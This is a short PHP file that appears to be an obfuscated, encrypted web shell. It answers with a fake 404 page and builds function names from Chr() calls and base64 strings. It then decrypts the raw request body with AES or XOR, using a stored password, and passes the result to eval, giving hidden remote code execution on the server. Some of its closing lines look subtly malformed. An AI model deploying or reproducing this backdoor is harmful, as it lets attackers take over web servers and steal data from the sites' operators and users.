<?php
header("HTTP/1.0 404 Not Found");@error_reporting(0);
session_start();${strliu}="<<<PASSWORD>>>";
$_SESSION['k']=${strliu};session_write_close();
${strqi} = Chr(98).Chr(97).Chr(115).Chr(101).Chr(54).Chr(52).Chr(95);
${strwu} = "\x63\x6f\x64\x65";${strsan} = ${strqi}.Chr(100).Chr(101).${strwu};
${strsi} = ${strsan}("ZmlsZV9nZXRfY29udGVudHM=");${strer} = ${strsan}("cGhwOi8vaW5wdXQ=");
${stryi} = ${strsan}("b3BlbnNzbF9kZWNyeXB0");${strshiyi}=${strsi}(${strer});
if(!extension_loaded('openssl')) {${strba} = function(${strshisi}, ${strshiwu}) {
return chr(ord(${strshisi}) ^ ord(${strshiwu}));};
for(${strshisan} = 0; ${strshisan} < strlen(${strshiyi}); ${strshisan}++) {
${strshiyi}[${strshisan}] = ${strba}(${strshiyi}[${strshisan}], ${strliu}[(${strshisan} +Chr("49"))&chr(49).chr(53)]);
}}else{${strshiyi}=${stryi}(${strshiyi}, "AES128", ${strliu});}
${strshier}=explode('|',${strshiyi});${strjiu}=${strshier}[1];
define("{strshi}","//{strsi}\r\n".${strjiu});@eval({strshi});
